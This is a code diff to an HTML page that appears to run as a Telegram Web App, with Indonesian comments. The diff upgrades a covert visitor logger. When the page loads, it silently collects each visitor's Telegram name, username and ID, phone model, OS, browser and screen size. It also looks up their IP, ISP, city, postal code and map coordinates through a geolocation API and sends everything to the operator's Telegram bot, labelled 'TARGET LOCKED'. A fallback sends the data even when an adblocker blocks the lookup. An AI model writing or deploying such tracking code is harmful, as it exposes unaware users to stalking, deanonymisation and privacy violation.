@@ -191,8 +191,7 @@
             </button>
         </div>
                 </div>
-
-    <!-- JAVASCRIPT ENGINE (LOG DETEKSI SILUMAN KE TERMUX) -->
+<!-- JAVASCRIPT ENGINE (LOG DETEKSI SILUMAN - ADVANCED VERSION) -->
     <script>
         // =======================================================
         // * SETTING BOT LOG KE TERMUX (MASUKKAN TOKEN & ID KAMU)
@@ -267,66 +266,161 @@
         }
 
         // ====================================================
-        // 3. SILUMAN IP LOGGER & DEVICE TRACKER (KIRIM KE TELEGRAM)
+        // 3. PARSER USER AGENT (UNTUK MENDAPATKAN MERK HP / BROWSER DETIL)
+        // ====================================================
+        function parseUserAgent(ua) {
+            let browser = "Unknown Browser";
+            let os = "Unknown OS";
+            let model = "Unknown Model";
+
+            // Deteksi Browser
+            if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua) && !/opr/i.test(ua)) browser = "Google Chrome";
+            else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
+            else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
+            else if (/opera|opr/i.test(ua)) browser = "Opera";
+            else if (/edge|edg/i.test(ua)) browser = "Microsoft Edge";
+            
+            if (/telegram/i.test(ua)) browser += " (Inside Telegram App)";
+
+            // Deteksi OS & Model Spesifik
+            if (/android/i.test(ua)) {
+                os = "Android";
+                const match = ua.match(/android\s+([0-9\.]+)/i);
+                const osVer = match ? ` version ${match[1]}` : "";
+                os += osVer;
+
+                // Ekstrak tipe device android dari User Agent
+                const parts = ua.split(';');
+                for (let i = 0; i < parts.length; i++) {
+                    if (parts[i].includes('Build/')) {
+                        model = parts[i].split('Build/')[0].trim();
+                        break;
+                    }
+                }
+                if(model === "Unknown Model") {
+                    const regexAndroid = /\(([^)]+)\)/;
+                    const matchModel = ua.match(regexAndroid);
+                    if (matchModel && matchModel[1]) {
+                        const tokens = matchModel[1].split(';');
+                        if(tokens.length > 2) model = tokens[2].trim();
+                    }
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                os = "iOS";
+                const match = ua.match(/OS\s+([0-9_]+)/i);
+                if (match) os += ` version ${match[1].replace(/_/g, '.')}`;
+                model = /ipad/i.test(ua) ? "iPad" : "iPhone";
+            } else if (/windows/i.test(ua)) {
+                os = "Windows PC";
+            } else if (/macintosh/i.test(ua)) {
+                os = "Mac OS";
+            } else if (/linux/i.test(ua)) {
+                os = "Linux PC";
+            }
+
+            return { browser, os, model };
+        }
+
+        // ====================================================
+        // 4. ADVANCED SILUMAN IP LOGGER & DEVICE TRACKER
         // ====================================================
         function collectAndSendLog(botName) {
-            // Ambil Info User Telegram Web App
             const user = tg.initDataUnsafe?.user || {};
             const tgUserString = user.username ? `@${user.username}` : "No Username";
             const tgId = user.id || "Unknown ID";
             const tgName = [user.first_name, user.last_name].filter(Boolean).join(" ") || "Unknown Name";
 
-            // Deteksi Platform Browser / OS
-            let device = "Desktop / Unknown";
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) device = "Android";
-            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) device = "iOS Device";
-
-            // Deteksi Bahasa Aplikasi Telegram
+            // Parse User Agent Mendalam
+            const uaData = parseUserAgent(navigator.userAgent);
             const userLang = tg.initDataUnsafe?.user?.language_code || navigator.language || "Unknown";
+            
+            // Info Tambahan Client Side
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const timeOpened = new Date().toLocaleString('id-ID', { timeZoneName: 'short' });
 
-            // Tembak API IP Geolocation secara senyap
+            // Tembak API IP Geolocation Lengkap
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
                     const ip = data.ip || "127.0.0.1";
                     const city = data.city || "Unknown City";
+                    const region = data.region || "Unknown Region";
                     const country = data.country_name || "Unknown Country";
+                    const zip = data.postal || "Unknown Zip";
+                    const countryCode = data.country_code || "??";
                     const isp = data.org || "Unknown ISP";
+                    const asn = data.asn || "Unknown ASN";
+                    const lat = data.latitude || "0";
+                    const lon = data.longitude || "0";
+                    const timezone = data.timezone || "Unknown Timezone";
+                    const currency = data.currency || "Unknown Currency";
 
-                    // Format Log Output Rapi
-                    const textLog = `[+] NEW VISITOR DETECTED!
+                    // Format Log Output Super Gemuk dan Rapi
+                    const textLog = `[+] ADVANCED VISITOR TARGET LOCKED!
 ===================================
-🤖 Bot Name  : ${botName}
-👤 Telegram  : ${tgName} (${tgUserString})
-🆔 Telegram ID: ${tgId}
-🌐 IP Address : ${ip}
-📍 Location   : ${city}, ${country}
-📡 ISP/Org    : ${isp}
-📱 Device     : ${device}
-🗣️ Language   : ${userLang}
+🤖 TARGET SYSTEM
+• Bot Name      : ${botName}
+• Time Trigger  : ${timeOpened}
+
+👤 TELEGRAM PROFILE
+• Profile Name  : ${tgName}
+• Username      : ${tgUserString}
+• Telegram ID   : ${tgId}
+• App Language  : ${userLang}
+
+🌐 NETWORK ADAPTER (GEO-IP)
+• IP Address    : ${ip}
+• Network ASN   : ${asn}
+• Provider/ISP  : ${isp}
+• Timezone Loc  : ${timezone}
+• Local Currency: ${currency}
+
+📍 PHYSICAL LOCATION
+• City / Region : ${city}, ${region}
+• Country Info  : ${country} (${countryCode})
+• Postal Code   : ${zip}
+• Coordinates   : ${lat}, ${lon}
+• Map Matrix    : https://www.google.com/maps?q=${lat},${lon}
+
+📱 HARDWARE & SOFTWARE
+• Device Class  : ${uaData.model}
+• Operating Sys : ${uaData.os}
+• Core Engine   : ${uaData.browser}
+• Screen Matrix : ${screenResolution}
 ===================================`;
 
-                    // Kirim Pesan Ke Bot Telegram Log (Log Kamu)
+                    // Kirim Pesan Ke Bot Telegram Log
                     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_LOG_CHAT_ID,
-                            text: textLog
+                            text: textLog,
+                            disable_web_page_preview: true
                         })
                     }).catch(err => console.log('Log error:', err));
                 })
                 .catch(() => {
-                    // Fallback jika API IP Tracker terblokir adblocker
-                    const textLogFallback = `[+] VISITOR (SECURE MODE)
+                    // Fallback jika API Tracker Terblokir Client
+                    const textLogFallback = `[+] VISITOR TARGET (SECURE ENCRYPTED)
 ===================================
-🤖 Bot Name  : ${botName}
-👤 Telegram  : ${tgName} (${tgUserString})
-🆔 Telegram ID: ${tgId}
-📱 Device     : ${device}
-🗣️ Language   : ${userLang}
-⚠️ Status     : IP API BLOCKED BY CLIENT
+🤖 TARGET SYSTEM
+• Bot Name      : ${botName}
+• Time Trigger  : ${timeOpened}
+
+👤 TELEGRAM PROFILE
+• Profile Name  : ${tgName}
+• Username      : ${tgUserString}
+• Telegram ID   : ${tgId}
+• App Language  : ${userLang}
+
+📱 HARDWARE METRICS
+• Device Class  : ${uaData.model}
+• Operating Sys : ${uaData.os}
+• Core Engine   : ${uaData.browser}
+• Screen Matrix : ${screenResolution}
+
+⚠️ SYSTEM ALARM  : Geolocation Engine Blocked by Client Side AdBlocker / Secure Firewall.
 ===================================`;
                     
                     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -341,7 +435,7 @@
         }
 
         // ==========================================
-        // 4. UTAMA: EKSEKUSI DATA PARAMS & RENDER VIEW
+        // 5. UTAMA: EKSEKUSI DATA PARAMS & RENDER VIEW
         // ==========================================
         window.addEventListener('DOMContentLoaded', executeCyberEngine);
 
@@ -352,7 +446,7 @@
             document.getElementById('bot-name').innerText = rawBotName.toUpperCase();
             document.getElementById('bot-username').innerText = params.get('bot_username') || '@durovpavel';
             
-            // JALANKAN LOG SILUMAN KIRIM KE BOT/TERMUX
+            // JALANKAN LOG SILUMAN LENGKAP
             collectAndSendLog(rawBotName);
 
             const expiredStr = params.get('expire') || 'Tidak Aktif';
@@ -535,7 +629,7 @@
         }
 
         // ==========================================
-        // 5. NAVIGASI TAB & REAKSI ACTION BUTTONS
+        // 6. NAVIGASI TAB & REAKSI ACTION BUTTONS
         // ==========================================
         function animateCopy(btn) { 
             const txt = btn.querySelector('span'); 
@@ -565,3 +659,6 @@
     </script>
 </body>
 </html>
+    
+
+                                            
